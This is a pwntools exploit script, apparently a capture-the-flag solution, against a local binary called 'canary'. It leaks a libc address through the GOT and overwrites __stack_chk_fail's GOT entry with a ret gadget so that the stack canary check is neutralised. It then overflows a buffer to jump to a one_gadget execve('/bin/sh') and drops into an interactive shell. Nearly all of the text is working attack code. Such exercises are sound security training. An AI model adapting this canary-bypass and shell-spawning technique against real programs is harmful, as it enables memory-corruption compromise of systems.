from pwn import *

context.log_level = 'debug'

io = process('./canary')

elf = ELF('./canary')
# libc = ELF('./libc-2.31.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# gdb.attach(io, 'b*0x000401359\n\c')

# pop_rdi_ret = 0x00000000004013e3
# pop_r12_r13_r14_r15_ret = 0x00000000004013dc
ret = 0x000000000040101a

io.sendlineafter('?', '0')

write_1_s_v3 = 0x4012ea
success(hex(elf.got['read']))
payload = p64(elf.got['read'] - 4 + 0x50) + p64(write_1_s_v3)

io.send(payload)

leak = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.info('leak:' + hex(leak))
libc_base = leak - libc.symbols['read']
log.info('libc_base: ' + hex(libc_base))

# ogg = libc_base + 0xe3afe # libc 231
ogg = libc_base + 0x4527a  # libc 223

""" # RBP value at this time
rbp = READ_GOT - 4 + 0x50
v5 = rbp-0x54 = READ_GOT - 8 = view the PLT table, READ_GOT - 8 = __stack_chk_fail, that is, the +8 position of the lead objective function is required to override
"""
io.sendlineafter('?', str(ret)) # Cover __stack_chk_fail@got.plt with ret, the next check failure will ret

gift = elf.sym['gift']
payload = p64(0) + p64(gift)
io.send(payload)

'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''
# payload = b'a'*56 + p64(0)*2 + p64(pop_r12_r13_r14_r15_ret) + p64(0)*4 + p64(ogg)
payload = b'a' * 56 + p64(0) * 2 + p64(ogg)
io.send(payload)

io.interactive()